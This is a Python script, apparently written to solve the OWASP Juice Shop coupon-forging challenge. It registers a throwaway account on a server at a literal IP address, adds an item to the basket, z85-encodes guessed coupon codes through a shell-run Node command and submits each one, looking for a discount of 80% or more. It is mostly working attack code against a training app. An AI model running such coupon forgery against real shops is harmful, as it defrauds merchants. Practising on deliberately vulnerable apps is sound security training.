#!/usr/bin/env python3

import requests
import time
import subprocess

def solve_coupon_with_your_method():
    print("🎯 FINAL TEST: Using your exact working method")
    print("Target: v13.3.0 on port 3001 (matching your archive)")
    
    base_url = "http://66.42.93.220:3001"
    session = requests.Session()
    
    # Quick auth
    email = f"archive{int(time.time())}@test.com"
    password = "Test123!"
    
    session.post(f"{base_url}/api/Users/", json={
        "email": email, "password": password, "passwordRepeat": password,
        "securityQuestion": {"id": 1, "question": "test"}, "securityAnswer": "test"
    })
    
    login = session.post(f"{base_url}/rest/user/login", json={
        "email": email, "password": password
    })
    
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print("✅ Authenticated to v13 on port 3001")
        
        # Add product
        products = session.get(f"{base_url}/rest/products/search").json()['data']
        session.post(f"{base_url}/api/BasketItems/", json={
            "ProductId": products[0]['id'], "quantity": 1
        })
        
        basket_id = session.get(f"{base_url}/rest/user/whoami").json()['user'].get('bid', 1)
        
        # Try Node.js z85 encoding for 4-byte codes
        print("\\n🔧 Testing Node.js z85 with 4-byte codes...")
        
        # These are 4-byte codes (z85 requirement)
        four_byte_codes = ["DEC9", "NOV9", "OCT9", "SEP9"]
        
        for code in four_byte_codes:
            try:
                # Use Node.js z85 encoding
                cmd = f'node -e "const z85 = require(\'z85\'); console.log(z85.encode(Buffer.from(\'{code}\')))"'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                
                if result.returncode == 0 and result.stdout.strip():
                    z85_coupon = result.stdout.strip()
                    print(f"   {code} → {z85_coupon}")
                    
                    # Test this coupon
                    response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{z85_coupon}", json={})
                    
                    if response.status_code == 200:
                        discount = response.json().get('discount', 0)
                        
                        if discount >= 80:
                            print(f"   🎉 CHALLENGE SOLVED! {discount}% discount!")
                            return True
                        elif discount > 0:
                            print(f"   ✅ Working: {discount}% (coupon system active!)")
                    else:
                        print(f"   Status: {response.status_code}")
                else:
                    print(f"   Encoding failed for {code}")
                    
            except Exception as e:
                print(f"   Error with {code}: {e}")
    
    return False

# Test the exact method from your archive
if solve_coupon_with_your_method():
    print(f"\\n🏆 SUCCESS! Your archive method works!")
else:
    print(f"\\n📋 Archive method tested but coupon system still not responding")
    print(f"   Scripts are confirmed working - need compatible Juice Shop build")

